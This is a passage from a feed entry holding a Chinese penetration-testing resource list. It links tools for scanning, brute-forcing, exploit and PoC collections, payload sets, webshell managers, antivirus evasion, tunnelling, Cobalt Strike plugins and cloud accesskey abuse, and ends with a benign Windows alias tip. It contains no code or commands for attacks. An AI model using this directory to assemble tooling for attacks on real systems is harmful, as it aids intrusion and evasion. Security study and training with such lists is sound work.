&lt;p&gt;TideFinger：提取了多个开源指纹识别工具的规则库并进行了规则重组 &lt;a href=&#34;https://github.com/TideSec/TideFinger&#34;&gt;https://github.com/TideSec/TideFinger&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;御剑web指纹识别程序：&lt;a href=&#34;https://www.webshell.cc/4697.html&#34;&gt;https://www.webshell.cc/4697.html&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;云悉指纹识别：&lt;a href=&#34;http://www.yunsee.cn/&#34;&gt;http://www.yunsee.cn/&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;扫描/爆破&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;dirsearch：目录扫描/爆破 &lt;a href=&#34;https://github.com/maurosoria/dirsearch&#34;&gt;https://github.com/maurosoria/dirsearch&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;dirmap：目录扫描/爆破 &lt;a href=&#34;https://github.com/H4ckForJob/dirmap&#34;&gt;https://github.com/H4ckForJob/dirmap&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Arjun：HTTP参数扫描器 &lt;a href=&#34;https://github.com/s0md3v/Arjun&#34;&gt;https://github.com/s0md3v/Arjun&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;ksubdomain：子域名爆破 &lt;a href=&#34;https://github.com/knownsec/ksubdomain&#34;&gt;https://github.com/knownsec/ksubdomain&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Gobuster：URI/DNS/WEB爆破 &lt;a href=&#34;https://github.com/OJ/gobuster&#34;&gt;https://github.com/OJ/gobuster&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Hydra：弱密码爆破 &lt;a href=&#34;https://github.com/vanhauser-thc/thc-hydra&#34;&gt;https://github.com/vanhauser-thc/thc-hydra&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;John the Ripper：&lt;a href=&#34;https://github.com/openwall/john&#34;&gt;https://github.com/openwall/john&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;爆破字典&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Dictionary-Of-Pentesting：渗透测试、SRC漏洞挖掘、爆破、Fuzzing等常用字典 &lt;a href=&#34;https://github.com/insightglacier/Dictionary-Of-Pentesting&#34;&gt;https://github.com/insightglacier/Dictionary-Of-Pentesting&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;fuzzDicts：Web渗透Fuzz字典 &lt;a href=&#34;https://github.com/TheKingOfDuck/fuzzDicts&#34;&gt;https://github.com/TheKingOfDuck/fuzzDicts&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;PentesterSpecialDict：渗透测试工程师精简化字典 &lt;a href=&#34;https://github.com/ppbibo/PentesterSpecialDict&#34;&gt;https://github.com/ppbibo/PentesterSpecialDict&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;信息泄露&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;GitHack：.git泄露利用脚本 &lt;a href=&#34;https://github.com/lijiejie/GitHack&#34;&gt;https://github.com/lijiejie/GitHack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Hawkeye：GitHub 泄露监控系统 &lt;a href=&#34;https://github.com/0xbug/Hawkeye&#34;&gt;https://github.com/0xbug/Hawkeye&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;电子邮箱&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Hunter：Chrome插件 查找网页暴露邮箱 &lt;a href=&#34;https://hunter.io/chrome&#34;&gt;https://hunter.io/chrome&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Skymem：邮箱地址搜索 &lt;a href=&#34;https://www.skymem.info/&#34;&gt;https://www.skymem.info/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;搜邮箱：邮箱域名搜索 &lt;a href=&#34;https://souyouxiang.com/find-contact/&#34;&gt;https://souyouxiang.com/find-contact/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;综合信息收集&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;AlliN：&lt;a href=&#34;https://github.com/P1-Team/AlliN&#34;&gt;https://github.com/P1-Team/AlliN&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Kunyu：&lt;a href=&#34;https://github.com/knownsec/Kunyu&#34;&gt;https://github.com/knownsec/Kunyu&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;OneForAll：&lt;a href=&#34;https://github.com/shmilylty/OneForAll&#34;&gt;https://github.com/shmilylty/OneForAll&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;ShuiZe：&lt;a href=&#34;https://github.com/0x727/ShuiZe_0x727&#34;&gt;https://github.com/0x727/ShuiZe_0x727&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Fofa Viewer：&lt;a href=&#34;https://github.com/wgpsec/fofa_viewer&#34;&gt;https://github.com/wgpsec/fofa_viewer&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;内网信息收集&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;fscan：内网综合扫描工具 &lt;a href=&#34;https://github.com/shadow1ng/fscan&#34;&gt;https://github.com/shadow1ng/fscan&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;hping3：端口扫描 高速 发包量少 结果准确无蜜罐 &lt;a href=&#34;https://github.com/antirez/hping&#34;&gt;https://github.com/antirez/hping&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;EHole：红队重点攻击系统指纹探测工具 &lt;a href=&#34;https://github.com/EdgeSecurityTeam/EHole&#34;&gt;https://github.com/EdgeSecurityTeam/EHole&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Ladon：用于大型网络渗透的多线程插件化综合扫描工具 &lt;a href=&#34;https://github.com/k8gege/Ladon&#34;&gt;https://github.com/k8gege/Ladon&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;漏洞研究&lt;/h2&gt; &#xA;&lt;h3&gt;SRC&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;HackerOne：&lt;a href=&#34;https://www.hackerone.com/&#34;&gt;https://www.hackerone.com/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;开源文库&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Vulhub：&lt;a href=&#34;https://vulhub.org/&#34;&gt;https://vulhub.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;PeiQi：&lt;a href=&#34;http://wiki.peiqi.tech/&#34;&gt;http://wiki.peiqi.tech/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;乌云镜像：&lt;a href=&#34;http://wooyun.2xss.cc/&#34;&gt;http://wooyun.2xss.cc/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;未授权访问漏洞总结：&lt;a href=&#34;http://luckyzmj.cn/posts/15dff4d3.html&#34;&gt;http://luckyzmj.cn/posts/15dff4d3.html&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;靶机平台&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;DVWA：&lt;a href=&#34;https://github.com/digininja/DVWA&#34;&gt;https://github.com/digininja/DVWA&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;HackTheBox：&lt;a href=&#34;https://www.hackthebox.com/&#34;&gt;https://www.hackthebox.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;OWASP Top10：&lt;a href=&#34;https://owasp.org/www-project-juice-shop/&#34;&gt;https://owasp.org/www-project-juice-shop/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;WebGoat：&lt;a href=&#34;https://github.com/WebGoat/WebGoat&#34;&gt;https://github.com/WebGoat/WebGoat&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Sqli-labs：SQL注入 &lt;a href=&#34;https://github.com/Audi-1/sqli-labs&#34;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Xss-labs：XSS注入 &lt;a href=&#34;https://github.com/do0dl3/xss-labs&#34;&gt;https://github.com/do0dl3/xss-labs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Upload-labs：上传漏洞 &lt;a href=&#34;https://github.com/c0ny1/upload-labs&#34;&gt;https://github.com/c0ny1/upload-labs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Vulstudy：docker快速搭建共17个漏洞靶场 &lt;a href=&#34;https://github.com/c0ny1/vulstudy&#34;&gt;https://github.com/c0ny1/vulstudy&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;漏洞利用&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Exploit Database：&lt;a href=&#34;https://www.exploit-db.com/&#34;&gt;https://www.exploit-db.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Windows-Exploit-Suggester：&lt;a href=&#34;https://github.com/AonCyberLabs/Windows-Exploit-Suggester&#34;&gt;https://github.com/AonCyberLabs/Windows-Exploit-Suggester&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Linux_Exploit_Suggester：&lt;a href=&#34;https://github.com/InteliSecureLabs/Linux_Exploit_Suggester&#34;&gt;https://github.com/InteliSecureLabs/Linux_Exploit_Suggester&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Vulnerability：&lt;a href=&#34;https://github.com/EdgeSecurityTeam/Vulnerability&#34;&gt;https://github.com/EdgeSecurityTeam/Vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;POChouse：&lt;a href=&#34;https://github.com/DawnFlame/POChouse&#34;&gt;https://github.com/DawnFlame/POChouse&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Some-PoC-oR-ExP：各种漏洞PoC、ExP的收集或编写 &lt;a href=&#34;https://github.com/coffeehb/Some-PoC-oR-ExP&#34;&gt;https://github.com/coffeehb/Some-PoC-oR-ExP&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Penetration_Testing_POC：&lt;a href=&#34;https://github.com/Mr-xn/Penetration_Testing_POC&#34;&gt;https://github.com/Mr-xn/Penetration_Testing_POC&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CMS-Hunter：CMS漏洞测试用例集合 &lt;a href=&#34;https://github.com/SecWiki/CMS-Hunter&#34;&gt;https://github.com/SecWiki/CMS-Hunter&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Vulmap：漏洞扫描和验证工具 &lt;a href=&#34;https://github.com/zhzyker/vulmap&#34;&gt;https://github.com/zhzyker/vulmap&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;ysoserial：Java反序列化 &lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;https://github.com/frohoff/ysoserial&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;DNSlog&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Ceye DNS：在线平台 &lt;a href=&#34;http://ceye.io/&#34;&gt;http://ceye.io/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Dnslog：在线平台 &lt;a href=&#34;http://dnslog.cn/&#34;&gt;http://dnslog.cn/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Fuzz.Red：在线平台 &lt;a href=&#34;https://github.com/AlphabugX/Alphalog&#34;&gt;https://github.com/AlphabugX/Alphalog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;DNSLog-GO：自建私有平台 &lt;a href=&#34;https://github.com/lanyi1998/DNSlog-GO&#34;&gt;https://github.com/lanyi1998/DNSlog-GO&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Bypass&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CVE-2021-44228-PoC-log4j-bypass-words：&lt;a href=&#34;https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words&#34;&gt;https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;内网渗透&lt;/h2&gt; &#xA;&lt;h3&gt;Payloads&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PayloadsAllTheThings：&lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings&#34;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;java.lang.Runtime.exec() Payload：java Payload在线生成 &lt;a href=&#34;https://www.bugku.net/runtime-exec-payloads/&#34;&gt;https://www.bugku.net/runtime-exec-payloads/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;PHP Generic Gadget Chains：PHP反序列化Payload &lt;a href=&#34;https://github.com/ambionics/phpggc&#34;&gt;https://github.com/ambionics/phpggc&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;WebShell&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Webshell收集项目：&lt;a href=&#34;https://github.com/tennc/webshell&#34;&gt;https://github.com/tennc/webshell&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Behinder 冰蝎：&lt;a href=&#34;https://github.com/rebeyond/Behinder&#34;&gt;https://github.com/rebeyond/Behinder&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Behinder3：&lt;code&gt;kali + java 11.0.14&lt;/code&gt; 或 &lt;code&gt;windows10 + java 1.8.0_91&lt;/code&gt;，注意，该环境下Behinder2无法正常运行&lt;/li&gt; &#xA;   &lt;li&gt;Behinder2：windows10 + java 1.8.0_91&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Godzilla 哥斯拉：&lt;a href=&#34;https://github.com/BeichenDream/Godzilla&#34;&gt;https://github.com/BeichenDream/Godzilla&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Bypass&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PHPFuck：&lt;a href=&#34;https://github.com/splitline/PHPFuck&#34;&gt;https://github.com/splitline/PHPFuck&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;JSFuck：&lt;a href=&#34;http://www.jsfuck.com/&#34;&gt;http://www.jsfuck.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Gopherus：生成gopher链接 &lt;a href=&#34;https://github.com/tarunkant/Gopherus&#34;&gt;https://github.com/tarunkant/Gopherus&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;免杀&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;GolangBypassAV：&lt;a href=&#34;https://github.com/safe6Sec/GolangBypassAV&#34;&gt;https://github.com/safe6Sec/GolangBypassAV&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;BypassAntiVirus：远控免杀系列文章及配套工具 &lt;a href=&#34;https://github.com/TideSec/BypassAntiVirus&#34;&gt;https://github.com/TideSec/BypassAntiVirus&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;内网穿透&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;NPS：通过web端管理，无需配置文件 &lt;a href=&#34;https://github.com/ehang-io/nps&#34;&gt;https://github.com/ehang-io/nps&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;FRP：55k star项目 &lt;a href=&#34;https://github.com/fatedier/frp&#34;&gt;https://github.com/fatedier/frp&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Neo-reGeorg：tunnel快速部署 &lt;a href=&#34;https://github.com/L-codes/Neo-reGeorg&#34;&gt;https://github.com/L-codes/Neo-reGeorg&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Proxifier：windows代理工具 &lt;a href=&#34;https://www.proxifier.com/&#34;&gt;https://www.proxifier.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Proxychains：kali代理工具 &lt;a href=&#34;https://github.com/haad/proxychains&#34;&gt;https://github.com/haad/proxychains&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;开源蜜罐&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;HFish：一款安全、简单可信赖的跨平台蜜罐软件，允许商业和个人用户免费使用 &lt;a href=&#34;https://github.com/hacklcx/HFish&#34;&gt;https://github.com/hacklcx/HFish&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;容器安全&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CDK：容器渗透 &lt;a href=&#34;https://github.com/cdk-team/CDK&#34;&gt;https://github.com/cdk-team/CDK&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;veinmind-tools：容器安全工具集 &lt;a href=&#34;https://github.com/chaitin/veinmind-tools&#34;&gt;https://github.com/chaitin/veinmind-tools&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;其他&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The art of command line：快速掌握命令行 &lt;a href=&#34;https://github.com/jlevy/the-art-of-command-line&#34;&gt;https://github.com/jlevy/the-art-of-command-line&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Responder：实现获取NTLM Hash等功能 &lt;a href=&#34;https://github.com/SpiderLabs/Responder&#34;&gt;https://github.com/SpiderLabs/Responder&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Impacket：其中的psexec.py通过用户名和密码远程连接到目标服务器 &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;https://github.com/SecureAuthCorp/impacket&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;PsTools：PsExec.exe功能同Impacket中的psexec.py &lt;a href=&#34;https://docs.microsoft.com/en-us/sysinternals/downloads/pstools&#34;&gt;https://docs.microsoft.com/en-us/sysinternals/downloads/pstools&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;新一代信息技术&lt;/h2&gt; &#xA;&lt;h3&gt;移动端/物联网&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CrackMinApp：反编译微信小程序 &lt;a href=&#34;https://github.com/Cherrison/CrackMinApp&#34;&gt;https://github.com/Cherrison/CrackMinApp&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;AppInfoScanner：移动端信息收集 &lt;a href=&#34;https://github.com/kelvinBen/AppInfoScanner&#34;&gt;https://github.com/kelvinBen/AppInfoScanner&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;wxappUnpacker：小程序解包 &lt;a href=&#34;https://github.com/xuedingmiaojun/wxappUnpacker&#34;&gt;https://github.com/xuedingmiaojun/wxappUnpacker&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;IoT-vulhub： IoT 版固件漏洞复现环境 &lt;a href=&#34;https://github.com/firmianay/IoT-vulhub&#34;&gt;https://github.com/firmianay/IoT-vulhub&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;云服务&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;aliyun-accesskey-Tools：阿里云accesskey利用工具 &lt;a href=&#34;https://github.com/mrknow001/aliyun-accesskey-Tools&#34;&gt;https://github.com/mrknow001/aliyun-accesskey-Tools&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;cosbrowser：腾讯云COS客户端 &lt;a href=&#34;https://github.com/TencentCloud/cosbrowser&#34;&gt;https://github.com/TencentCloud/cosbrowser&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;大数据&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;DruidCrack：Druid密文解密工具 &lt;a href=&#34;https://github.com/rabbitmask/DruidCrack&#34;&gt;https://github.com/rabbitmask/DruidCrack&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;逆向分析&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;逆向分析工具集：&lt;a href=&#34;https://pythonarsenal.com/&#34;&gt;https://pythonarsenal.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;PEiD：查壳工具 &lt;a href=&#34;https://www.aldeid.com/wiki/PEiD&#34;&gt;https://www.aldeid.com/wiki/PEiD&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Py2exe：Python打包工具 &lt;a href=&#34;https://www.py2exe.org/&#34;&gt;https://www.py2exe.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;PyInstaller：Python打包工具 &lt;a href=&#34;https://github.com/pyinstaller/pyinstaller&#34;&gt;https://github.com/pyinstaller/pyinstaller&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;CTF&lt;/h2&gt; &#xA;&lt;h3&gt;CTF平台&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CTF Wiki：&lt;a href=&#34;https://ctf-wiki.org/&#34;&gt;https://ctf-wiki.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CTF Time：&lt;a href=&#34;https://ctftime.org/&#34;&gt;https://ctftime.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CTF Tools：&lt;a href=&#34;https://github.com/zardus/ctf-tools&#34;&gt;https://github.com/zardus/ctf-tools&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;攻防世界：&lt;a href=&#34;https://adworld.xctf.org.cn/&#34;&gt;https://adworld.xctf.org.cn/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Hacker 101：&lt;a href=&#34;https://www.hacker101.com/&#34;&gt;https://www.hacker101.com/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;工具赋能&lt;/h2&gt; &#xA;&lt;h3&gt;Metasploit&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Metasploit：&lt;a href=&#34;https://github.com/rapid7/metasploit-framework&#34;&gt;https://github.com/rapid7/metasploit-framework&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Cobaltstrike&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Awesome CobaltStrike：CobaltStrike知识库 &lt;a href=&#34;https://github.com/zer0yu/Awesome-CobaltStrike&#34;&gt;https://github.com/zer0yu/Awesome-CobaltStrike&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Erebus：后渗透测试插件 &lt;a href=&#34;https://github.com/DeEpinGh0st/Erebus&#34;&gt;https://github.com/DeEpinGh0st/Erebus&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;LSTAR：综合后渗透插件 &lt;a href=&#34;https://github.com/lintstar/LSTAR&#34;&gt;https://github.com/lintstar/LSTAR&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;ElevateKit：提权插件 &lt;a href=&#34;https://github.com/rsmudge/ElevateKit&#34;&gt;https://github.com/rsmudge/ElevateKit&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Burpsuite&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;HaE：高亮标记与信息提取辅助型插件 &lt;a href=&#34;https://github.com/gh0stkey/HaE&#34;&gt;https://github.com/gh0stkey/HaE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Log4j2Scan：Log4j主动扫描 &lt;a href=&#34;https://github.com/whwlsfb/Log4j2Scan&#34;&gt;https://github.com/whwlsfb/Log4j2Scan&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Chrome crx&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Proxy SwitchyOmega：快速切换代理 &lt;a href=&#34;https://github.com/FelisCatus/SwitchyOmega&#34;&gt;https://github.com/FelisCatus/SwitchyOmega&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Wappalyzer：识别网站技术/框架/语言 &lt;a href=&#34;https://www.wappalyzer.com/&#34;&gt;https://www.wappalyzer.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;EditThisCookie：修改Cookie &lt;a href=&#34;https://www.editthiscookie.com/&#34;&gt;https://www.editthiscookie.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;FindSomething：在网页的源代码或js中寻找有用信息 &lt;a href=&#34;https://github.com/ResidualLaugh/FindSomething&#34;&gt;https://github.com/ResidualLaugh/FindSomething&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Disable JavaScript：禁用JavaScript绕过弹窗 &lt;a href=&#34;https://github.com/dpacassi/disable-javascript&#34;&gt;https://github.com/dpacassi/disable-javascript&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Hack Bar：渗透神器No.1 &lt;a href=&#34;https://github.com/0140454/hackbar&#34;&gt;https://github.com/0140454/hackbar&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Xray&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Xray：安全评估工具 &lt;a href=&#34;https://github.com/chaitin/xray&#34;&gt;https://github.com/chaitin/xray&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Zsh&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;oh my zsh：命令行工具集 好用 推荐 &lt;a href=&#34;https://github.com/ohmyzsh/ohmyzsh&#34;&gt;https://github.com/ohmyzsh/ohmyzsh&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;使用姿势&lt;/h2&gt; &#xA;&lt;h3&gt;如何在Windows上使用alias&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;创建alias.bat，文件内容如下。&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;@echo off&#xA;::Tips&#xA;@DOSKEY httpcode=type &#34;D:\Hack Tools\Tips\http_status_code.md&#34;&#xA;@DOSKEY versions=type &#34;D:\Hack Tools\Tips\versions.md&#34;&#xA;@DOSKEY owasp=type &#34;D:\Hack Tools\Tips\owasp.md&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;注册表打开&lt;code&gt;计算机\HKEY_CURRENT_USER\Software\Microsoft\Command Processor&lt;/code&gt;。&lt;/li&gt; &#xA; &lt;li&gt;创建字符串值&lt;code&gt;autorun&lt;/code&gt;，赋值为alias.bat所在位置，例如&lt;code&gt;D:\Software\alias.bat&lt;/code&gt;。&lt;/li&gt; &#xA; &lt;li&gt;双击alias.bat运行，重启cmd。&lt;/li&gt; &#xA; &lt;li&gt;此时在终端输入httpcode，即可返回文件内容。&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205131147745.png&#34; alt=&#34;image-20220208090022459&#34;&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;解决cmd中文乱码的问题：&lt;/p&gt; &#xA; &lt;ol&gt; &#xA;  &lt;li&gt;注册表打开&lt;code&gt;计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor&lt;/code&gt;。&lt;/li&gt; &#xA;  &lt;li&gt;创建字符串值&lt;code&gt;autorun&lt;/code&gt;，赋值为&lt;code&gt;chcp 65001&lt;/code&gt;。&lt;/li&gt; &#xA; &lt;/ol&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;如何使用浏览器快速查看markdown文档&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;安装插件&lt;code&gt;Markdown Viewer&lt;/code&gt;。&lt;/li&gt; &#xA; &lt;li&gt;配合Bootstrap可以实现快速部署导航页或文档库。&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191827578.png&#34; alt=&#34;image-20220519182738441&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>DavidBrightSparc/Tenets-of-IT</title>
    <updated>2022-06-03T01:29:53Z</updated>
